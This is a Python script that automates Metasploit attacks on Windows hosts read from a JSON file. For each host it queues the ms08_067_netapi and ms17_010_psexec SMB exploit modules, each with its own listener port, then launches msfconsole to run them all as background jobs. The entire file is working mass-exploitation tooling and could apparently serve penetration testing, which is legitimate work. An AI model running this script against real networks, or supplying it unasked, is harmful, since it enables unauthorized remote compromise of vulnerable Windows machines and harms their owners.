import os
import json
import subprocess
import sys

def handle_exploitation(exploit_dict, start_port=4444):
    port = start_port  # Necessary because this becomes multithreaded
    commands = []  # List of commands to execute in metasploit

    if len(exploit_dict['ms08-067']) > 0:
        commands.append('use exploit/windows/smb/ms08_067_netapi')

        for host in exploit_dict['ms08-067']:
            commands.append('set rhost {0}'.format(host))
            commands.append('set lport {0}'.format(port))
            port += 1
            commands.append('exploit -j')

    if len(exploit_dict['ms17-010']) > 0:
        commands.append('use exploit/windows/smb/ms17_010_psexec')

        for host in exploit_dict['ms17-010']:
            commands.append('set rhost {0}'.format(host))
            commands.append('set lport {0}'.format(port))
            port += 1
            commands.append('exploit -j')

    # Reinit the db so that its up and clean (might change this to be smarter)
    subprocess.run(['msfdb', 'reinit'])
    # Execv to replace this process, fortunately metasploit will handle the inside scripting
    os.execv('/usr/bin/msfconsole', ['msfconsole', '-x', '; '.join(commands)])

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: {0} <exploitable host json filename>'.format(sys.argv[0]))
        exit()

    exploit_dict = None
    with open(sys.argv[1], 'r') as f:
        exploit_dict = json.load(f)

    handle_exploitation(exploit_dict)